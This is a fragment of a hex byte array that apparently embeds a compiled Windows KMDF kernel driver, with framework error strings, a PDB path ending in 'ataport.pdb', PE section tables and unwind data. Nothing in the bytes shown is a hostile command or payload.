0x74, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x54, 0x79,
0x70, 0x65, 0x49, 0x6E, 0x66, 0x6F, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x0A, 0x00, 0x00,
0x46, 0x78, 0x53, 0x74, 0x75, 0x62, 0x42, 0x69, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x65,
0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65,
0x72, 0x20, 0x69, 0x6D, 0x61, 0x67, 0x65, 0x2C, 0x20, 0x74, 0x68, 0x65, 0x20, 0x61, 0x64, 0x64,
0x72, 0x65, 0x73, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x73, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x20, 0x5F,
0x5F, 0x4B, 0x4D, 0x44, 0x46, 0x5F, 0x43, 0x4C, 0x41, 0x53, 0x53, 0x5F, 0x42, 0x49, 0x4E, 0x44,
0x5F, 0x53, 0x54, 0x41, 0x52, 0x54, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x69, 0x73, 0x20, 0x67,
0x72, 0x65, 0x61, 0x74, 0x65, 0x72, 0x20, 0x74, 0x68, 0x61, 0x6E, 0x20, 0x74, 0x68, 0x65, 0x20,
0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x73, 0x79, 0x6D, 0x62, 0x6F,
0x6C, 0x20, 0x5F, 0x5F, 0x4B, 0x4D, 0x44, 0x46, 0x5F, 0x43, 0x4C, 0x41, 0x53, 0x53, 0x5F, 0x42,
0x49, 0x4E, 0x44, 0x5F, 0x45, 0x4E, 0x44, 0x20, 0x30, 0x78, 0x25, 0x70, 0x2C, 0x20, 0x73, 0x74,
0x61, 0x74, 0x75, 0x73, 0x20, 0x30, 0x78, 0x25, 0x78, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x46, 0x78, 0x47, 0x65, 0x74, 0x4E, 0x65, 0x78, 0x74, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x42, 0x69,
0x6E, 0x64, 0x49, 0x6E, 0x66, 0x6F, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x0A, 0x00, 0x00,
0x46, 0x78, 0x53, 0x74, 0x75, 0x62, 0x42, 0x69, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x65,
0x73, 0x3A, 0x20, 0x43, 0x6C, 0x69, 0x65, 0x6E, 0x74, 0x42, 0x69, 0x6E, 0x64, 0x43, 0x6C, 0x61,
0x73, 0x73, 0x20, 0x25, 0x70, 0x2C, 0x20, 0x57, 0x44, 0x46, 0x5F, 0x43, 0x4C, 0x41, 0x53, 0x53,
0x5F, 0x42, 0x49, 0x4E, 0x44, 0x5F, 0x49, 0x4E, 0x46, 0x4F, 0x20, 0x30, 0x78, 0x25, 0x70, 0x2C,
0x20, 0x63, 0x6C, 0x61, 0x73, 0x73, 0x20, 0x25, 0x53, 0x2C, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72,
0x6E, 0x65, 0x64, 0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x20, 0x30, 0x78, 0x25, 0x78, 0x0A,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x46, 0x78, 0x53, 0x74, 0x75, 0x62, 0x42, 0x69, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x65,
0x73, 0x3A, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x42, 0x69, 0x6E, 0x64, 0x43, 0x6C,
0x61, 0x73, 0x73, 0x20, 0x57, 0x44, 0x46, 0x5F, 0x43, 0x4C, 0x41, 0x53, 0x53, 0x5F, 0x42, 0x49,
0x4E, 0x44, 0x5F, 0x49, 0x4E, 0x46, 0x4F, 0x20, 0x30, 0x78, 0x25, 0x70, 0x2C, 0x20, 0x63, 0x6C,
0x61, 0x73, 0x73, 0x20, 0x25, 0x53, 0x2C, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6E, 0x65, 0x64,
0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x20, 0x30, 0x78, 0x25, 0x78, 0x0A, 0x00, 0x00, 0x00,
0x48, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x70, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x10, 0x61, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x18, 0x61, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x61, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
0x28, 0x61, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x30, 0x61, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
0x38, 0x61, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x40, 0x61, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x37, 0xAE, 0x68,
0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x67, 0x00, 0x00,
0x00, 0x5B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x37, 0xAE, 0x68, 0x00, 0x00, 0x00, 0x00,
0x0D, 0x00, 0x00, 0x00, 0xAC, 0x01, 0x00, 0x00, 0x50, 0x67, 0x00, 0x00, 0x50, 0x5B, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x01, 0x37, 0xAE, 0x68, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x52, 0x53, 0x44, 0x53, 0xF1, 0x4E, 0x8F, 0xF4, 0x9A, 0x79, 0xB2, 0x4F, 0xB4, 0x57, 0x7E, 0xD3,
0x8F, 0x97, 0x3E, 0x61, 0x01, 0x00, 0x00, 0x00, 0x43, 0x3A, 0x5C, 0x55, 0x73, 0x65, 0x72, 0x73,
0x5C, 0x6C, 0x69, 0x61, 0x6F, 0x5C, 0x44, 0x65, 0x73, 0x6B, 0x74, 0x6F, 0x70, 0x5C, 0x4C, 0x53,
0x2D, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x5C, 0x78, 0x36, 0x34, 0x5C, 0x52, 0x65, 0x6C, 0x65,
0x61, 0x73, 0x65, 0x5C, 0x61, 0x74, 0x61, 0x70, 0x6F, 0x72, 0x74, 0x2E, 0x70, 0x64, 0x62, 0x00,
0x47, 0x43, 0x54, 0x4C, 0x00, 0x10, 0x00, 0x00, 0xB0, 0x4D, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x5D, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00,
0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x24, 0x30, 0x30, 0x00, 0x40, 0x5E, 0x00, 0x00,
0x29, 0x01, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x73, 0x00, 0x00, 0x60, 0x00, 0x00,
0x10, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35, 0x00, 0x00, 0x00, 0x00,
0x10, 0x61, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x2E, 0x30, 0x30, 0x63, 0x66, 0x67, 0x00, 0x00,
0x90, 0x62, 0x00, 0x00, 0x70, 0x04, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
0x00, 0x67, 0x00, 0x00, 0x38, 0x02, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7A,
0x7A, 0x7A, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00, 0x38, 0x69, 0x00, 0x00, 0x20, 0x04, 0x00, 0x00,
0x2E, 0x78, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00,
0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x50, 0x70, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
0x2E, 0x6B, 0x6D, 0x64, 0x66, 0x63, 0x6C, 0x61, 0x73, 0x73, 0x62, 0x69, 0x6E, 0x64, 0x24, 0x61,
0x00, 0x00, 0x00, 0x00, 0x60, 0x70, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x6B, 0x6D, 0x64,
0x66, 0x63, 0x6C, 0x61, 0x73, 0x73, 0x62, 0x69, 0x6E, 0x64, 0x24, 0x63, 0x00, 0x00, 0x00, 0x00,
0x68, 0x70, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x6B, 0x6D, 0x64, 0x66, 0x63, 0x6C, 0x61,
0x73, 0x73, 0x62, 0x69, 0x6E, 0x64, 0x24, 0x64, 0x00, 0x00, 0x00, 0x00, 0x70, 0x70, 0x00, 0x00,
0x10, 0x00, 0x00, 0x00, 0x2E, 0x6B, 0x6D, 0x64, 0x66, 0x74, 0x79, 0x70, 0x65, 0x69, 0x6E, 0x69,
0x74, 0x24, 0x61, 0x00, 0x80, 0x70, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x2E, 0x6B, 0x6D, 0x64,
0x66, 0x74, 0x79, 0x70, 0x65, 0x69, 0x6E, 0x69, 0x74, 0x24, 0x63, 0x00, 0x90, 0x70, 0x00, 0x00,
0x14, 0x07, 0x00, 0x00, 0x2E, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00,
0x28, 0x02, 0x00, 0x00, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00,
0x30, 0x00, 0x00, 0x00, 0x49, 0x4E, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 0x30, 0x90, 0x00, 0x00,
0x28, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x32, 0x00, 0x00, 0x00, 0x00,
0x58, 0x90, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33,
0x00, 0x00, 0x00, 0x00, 0x70, 0x90, 0x00, 0x00, 0x10, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61,
0x74, 0x61, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0x80, 0x91, 0x00, 0x00, 0xC6, 0x02, 0x00, 0x00,
0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x0A, 0x08, 0x00, 0x01, 0x16, 0x11, 0x06,
0x2B, 0x06, 0x00, 0x06, 0x0A, 0x74, 0x02, 0x00, 0x05, 0x34, 0x01, 0x00, 0x0A, 0x08, 0x06, 0x00,
0x04, 0x16, 0x00, 0x06, 0x08, 0x32, 0x04, 0x70, 0x03, 0x60, 0x02, 0x30, 0x08, 0x58, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x1A, 0x12, 0x00, 0x00, 0x6A, 0x12, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0x6A, 0x12, 0x00, 0x00, 0x0A, 0x0F, 0x08, 0x00, 0x02, 0x16, 0x00, 0x06, 0x0F, 0x64, 0x0B, 0x00,
0x0F, 0x34, 0x0A, 0x00, 0x0F, 0x52, 0x0B, 0x70, 0x08, 0x58, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
0xA8, 0x12, 0x00, 0x00, 0xF7, 0x12, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xF7, 0x12, 0x00, 0x00,
0x28, 0x13, 0x00, 0x00, 0x3C, 0x13, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3C, 0x13, 0x00, 0x00,
0x0A, 0x00, 0x00, 0x00, 0x08, 0x58, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x90, 0x13, 0x00, 0x00,
0xB5, 0x13, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xB5, 0x13, 0x00, 0x00, 0x0A, 0x0F, 0x08, 0x00,
0x02, 0x16, 0x60, 0x06, 0x0F, 0x64, 0x07, 0x00, 0x0F, 0x34, 0x06, 0x00, 0x0F, 0x32, 0x0B, 0x70,
0x08, 0x58, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x35, 0x14, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x35, 0x14, 0x00, 0x00, 0x02, 0x1C, 0x0D, 0x00, 0x0C, 0x16, 0x00, 0x06,
0x1C, 0x34, 0x24, 0x00, 0x1C, 0x01, 0x1A, 0x00, 0x10, 0xF0, 0x0E, 0xE0, 0x0C, 0xD0, 0x0A, 0xC0,
0x08, 0x70, 0x07, 0x60, 0x06, 0x50, 0x00, 0x00, 0x02, 0x06, 0x04, 0x00, 0x02, 0x16, 0x00, 0x06,
0x06, 0x32, 0x02, 0x30, 0x02, 0x08, 0x03, 0x00, 0x08, 0xA2, 0x04, 0xE0, 0x02, 0x30, 0x00, 0x00,
0x22, 0x5D, 0x0A, 0x00, 0x5D, 0xC4, 0x0A, 0x00, 0x58, 0x74, 0x10, 0x00, 0x15, 0xF4, 0x08, 0x00,
0x0D, 0x64, 0x0F, 0x00, 0x05, 0x54, 0x0E, 0x00, 0xB0, 0x26, 0x00, 0x00, 0xE9, 0x26, 0x00, 0x00,
0x24, 0x6A, 0x00, 0x00, 0x22, 0x05, 0x02, 0x00, 0x05, 0xD4, 0x09, 0x00, 0xE9, 0x26, 0x00, 0x00,
0xDA, 0x27, 0x00, 0x00, 0x30, 0x6A, 0x00, 0x00, 0x22, 0x00, 0x00, 0x00, 0xE9, 0x26, 0x00, 0x00,
0xDA, 0x27, 0x00, 0x00, 0x30, 0x6A, 0x00, 0x00, 0x22, 0x00, 0x02, 0x00, 0x00, 0xD4, 0x09, 0x00,
0xE9, 0x26, 0x00, 0x00, 0xDA, 0x27, 0x00, 0x00, 0x30, 0x6A, 0x00, 0x00, 0x22, 0x00, 0x02, 0x00,
0x04, 0x16, 0x00, 0x06, 0xE9, 0x26, 0x00, 0x00, 0xDA, 0x27, 0x00, 0x00, 0x30, 0x6A, 0x00, 0x00,
0x22, 0x00, 0x0C, 0x00, 0x00, 0xF4, 0x08, 0x00, 0x00, 0xD4, 0x09, 0x00, 0x00, 0xC4, 0x0A, 0x00,
0x00, 0x74, 0x10, 0x00, 0x00, 0x64, 0x0F, 0x00, 0x00, 0x54, 0x0E, 0x00, 0xB0, 0x26, 0x00, 0x00,
0xE9, 0x26, 0x00, 0x00, 0x24, 0x6A, 0x00, 0x00, 0x22, 0x00, 0x02, 0x00, 0x04, 0x16, 0x00, 0x06,
0xB0, 0x26, 0x00, 0x00, 0xE9, 0x26, 0x00, 0x00, 0x24, 0x6A, 0x00, 0x00, 0x02, 0x14, 0x08, 0x00,
0x14, 0x34, 0x11, 0x00, 0x14, 0x72, 0x10, 0xF0, 0x0E, 0xE0, 0x0C, 0xD0, 0x0A, 0xC0, 0x08, 0x50,
0x22, 0x13, 0x04, 0x00, 0x13, 0x74, 0x0F, 0x00, 0x04, 0x64, 0x0E, 0x00, 0xF0, 0x2A, 0x00, 0x00,
0x56, 0x2B, 0x00, 0x00, 0xDC, 0x6A, 0x00, 0x00, 0x22, 0x00, 0x02, 0x00, 0x0A, 0x06, 0x11, 0x06,
0xF0, 0x2A, 0x00, 0x00, 0x56, 0x2B, 0x00, 0x00, 0xDC, 0x6A, 0x00, 0x00, 0x22, 0x13, 0x04, 0x00,
0x13, 0x74, 0x0F, 0x00, 0x04, 0x64, 0x0E, 0x00, 0x60, 0x2C, 0x00, 0x00, 0xC6, 0x2C, 0x00, 0x00,
0xDC, 0x6A, 0x00, 0x00, 0x22, 0x00, 0x02, 0x00, 0x0A, 0x06, 0x11, 0x06, 0x60, 0x2C, 0x00, 0x00,
0xC6, 0x2C, 0x00, 0x00, 0xDC, 0x6A, 0x00, 0x00, 0x0A, 0x15, 0x08, 0x00, 0x08, 0x16, 0x00, 0x06,
0x15, 0x72, 0x11, 0xF0, 0x0F, 0xE0, 0x0D, 0x70, 0x0C, 0x60, 0x0B, 0x30, 0x08, 0x58, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0xCA, 0x2E, 0x00, 0x00, 0xA9, 0x2F, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0xA9, 0x2F, 0x00, 0x00, 0x0A, 0x15, 0x0A, 0x00, 0x03, 0x16, 0x00, 0x06, 0x15, 0x74, 0x10, 0x00,
0x15, 0x64, 0x0F, 0x00, 0x15, 0x34, 0x0E, 0x00, 0x15, 0xB2, 0x11, 0xE0, 0x08, 0x58, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0xD8, 0x30, 0x00, 0x00, 0x1A, 0x31, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0x1A, 0x31, 0x00, 0x00, 0x0A, 0x15, 0x0A, 0x00, 0x03, 0x16, 0x00, 0x06, 0x15, 0x74, 0x10, 0x00,
0x15, 0x64, 0x0F, 0x00, 0x15, 0x34, 0x0E, 0x00, 0x15, 0xB2, 0x11, 0xE0, 0x08, 0x58, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x38, 0x32, 0x00, 0x00, 0x7A, 0x32, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0x7A, 0x32, 0x00, 0x00, 0x02, 0x17, 0x09, 0x00, 0x17, 0x01, 0x14, 0x00, 0x0B, 0xF0, 0x09, 0xE0,
0x07, 0xC0, 0x05, 0x70, 0x04, 0x60, 0x03, 0x30, 0x02, 0x50, 0x00, 0x00, 0x22, 0x08, 0x02, 0x00,
0x08, 0xD4, 0x13, 0x00, 0xA0, 0x32, 0x00, 0x00, 0x44, 0x34, 0x00, 0x00, 0xD4, 0x6B, 0x00, 0x00,
0x22, 0x00, 0x02, 0x00, 0x0B, 0x16, 0x00, 0x06, 0xA0, 0x32, 0x00, 0x00, 0x44, 0x34, 0x00, 0x00,
0xD4, 0x6B, 0x00, 0x00, 0x02, 0x19, 0x0C, 0x00, 0x0D, 0x16, 0x00, 0x06, 0x19, 0x01, 0x13, 0x00,
0x0D, 0xF0, 0x0B, 0xE0, 0x09, 0xD0, 0x07, 0xC0, 0x05, 0x70, 0x04, 0x60, 0x03, 0x30, 0x02, 0x50,
0x02, 0x14, 0x0A, 0x00, 0x14, 0x34, 0x14, 0x00, 0x14, 0xB2, 0x10, 0xF0, 0x0E, 0xE0, 0x0C, 0xD0,
0x0A, 0xC0, 0x08, 0x70, 0x07, 0x60, 0x06, 0x50, 0x0A, 0x10, 0x08, 0x00, 0x10, 0x92, 0x0C, 0xF0,
0x0A, 0xE0, 0x08, 0xD0, 0x06, 0xC0, 0x04, 0x70, 0x03, 0x60, 0x02, 0x30, 0x08, 0x58, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x77, 0x42, 0x00, 0x00, 0x9C, 0x42, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0x9C, 0x42, 0x00, 0x00, 0x02, 0x18, 0x08, 0x00, 0x18, 0x01, 0x71, 0x00, 0x09, 0xF0, 0x07, 0xE0,
0x05, 0x70, 0x04, 0x60, 0x03, 0x30, 0x02, 0x50, 0x22, 0x20, 0x04, 0x00, 0x20, 0xD4, 0x70, 0x00,
0x08, 0xC4, 0x78, 0x00, 0x20, 0x43, 0x00, 0x00, 0xB9, 0x44, 0x00, 0x00, 0x74, 0x6C, 0x00, 0x00,
0x22, 0x00, 0x02, 0x00, 0x09, 0x16, 0x00, 0x06, 0x20, 0x43, 0x00, 0x00, 0xB9, 0x44, 0x00, 0x00,
0x74, 0x6C, 0x00, 0x00, 0x22, 0x00, 0x04, 0x00, 0x00, 0xD4, 0x70, 0x00, 0x00, 0xC4, 0x78, 0x00,
0x20, 0x43, 0x00, 0x00, 0xB9, 0x44, 0x00, 0x00, 0x74, 0x6C, 0x00, 0x00, 0x02, 0x04, 0x03, 0x00,
0x01, 0x06, 0x02, 0x06, 0x04, 0x82, 0x00, 0x00, 0x02, 0x19, 0x0C, 0x00, 0x03, 0x06, 0x47, 0x06,
0x19, 0x74, 0x0B, 0x00, 0x19, 0x64, 0x0A, 0x00, 0x19, 0x54, 0x09, 0x00, 0x19, 0x34, 0x08, 0x00,
0x19, 0x52, 0x15, 0xE0, 0x02, 0x0A, 0x06, 0x00, 0x02, 0x06, 0x03, 0x06, 0x0A, 0x34, 0x06, 0x00,
0x0A, 0x32, 0x06, 0x70, 0x02, 0x04, 0x03, 0x00, 0x01, 0x06, 0x02, 0x06, 0x04, 0x42, 0x00, 0x00,
0x02, 0x0A, 0x06, 0x00, 0x02, 0x06, 0x03, 0x06, 0x0A, 0x34, 0x08, 0x00, 0x0A, 0x52, 0x06, 0x70,
0x02, 0x0F, 0x08, 0x00, 0x02, 0x06, 0x03, 0x06, 0x0F, 0x64, 0x09, 0x00, 0x0F, 0x34, 0x08, 0x00,
0x0F, 0x52, 0x0B, 0x70, 0x02, 0x14, 0x0A, 0x00, 0x02, 0x06, 0x6C, 0x06, 0x14, 0x64, 0x0C, 0x00,
0x14, 0x54, 0x0B, 0x00, 0x14, 0x34, 0x0A, 0x00, 0x14, 0x72, 0x10, 0x70, 0x00, 0x00, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x62, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBC, 0x01, 0x00, 0x00,
0xB8, 0x72, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x32, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00, 0xCD, 0x5D, 0x20, 0xD2, 0x66, 0xD4, 0xFF, 0xFF,
0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x70, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
